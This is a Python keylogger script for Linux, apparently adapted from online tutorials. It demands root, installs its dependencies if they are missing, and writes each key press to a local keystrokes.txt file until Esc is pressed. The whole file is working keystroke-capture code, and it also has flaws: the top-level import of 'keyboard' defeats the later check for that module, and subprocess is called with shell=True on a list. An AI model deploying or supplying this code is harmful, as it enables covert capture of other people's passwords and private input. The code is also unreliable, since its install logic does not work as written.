#!/usr/bin/env python3
# Code from https://www.geeksforgeeks.org/design-a-keylogger-in-python/
# Code from https://medium.com/@meetmeonmail04/a-simple-keylogger-using-python-ddc39d04b5ab
# Code edited in Visual Studio Code with guidance from Github Copilot extension
# Python code for keylogger to be used in linux

import subprocess
import sys
import logging
import keyboard
import os

logging.basicConfig(level=logging.INFO)

# Function to check if the module is installed
def check_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        return False
    return True

# Function to check if the command is installed
def check_command(command):
    result = subprocess.run(['which', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

# Function to install the required modules
def install_requirements():
    try:
        logging.info("Required modules not found. Running install_requirements.sh...")
        subprocess.check_call(['./install_requirements.sh'], shell=True)
        subprocess.check_call([sys.executable] + sys.argv)
    except subprocess.CalledProcessError as e:
        logging.error(f"An error occurred: {e}")
        sys.exit(1)

# Ensure the script is run as root
if os.geteuid() != 0:
    logging.error("This script must be run as root. Exiting.")
    sys.exit(1)
    
# Check if Python 3 is installed
if not check_command('python3'):
    logging.info("Python 3 is not installed.")
    install_requirements()
else:
    logging.info("Python 3 is already installed.")

# Check if pip for Python 3 is installed
if not check_command('pip3'):
    logging.info("pip for Python 3 is not installed.")
    install_requirements()
else:
    logging.info("pip for Python 3 is already installed.")

# Check if the 'keyboard' module is installed
if not check_module('keyboard'):
    logging.info("The 'keyboard' module is not installed.")
    install_requirements()
else:
    logging.info("The 'keyboard' module is already installed.")

# Import the 'keyboard' module
def keylogger():
    log_file = 'keystrokes.txt'

    def on_key_press(event):
        try:
            with open(log_file, 'a') as f:
                f.write('{}\n'.format(event.name))
        except Exception as e:
            logging.error(f"Failed to write to log file: {e}")

    # Start the keylogger
    keyboard.on_press(on_key_press)
    logging.info("Keylogger started. Press 'esc' to stop.")
    keyboard.wait('esc')  # Wait for 'esc' key to stop the keylogger
    logging.info("Keylogger stopped.")

# Call the keylogger function
keylogger()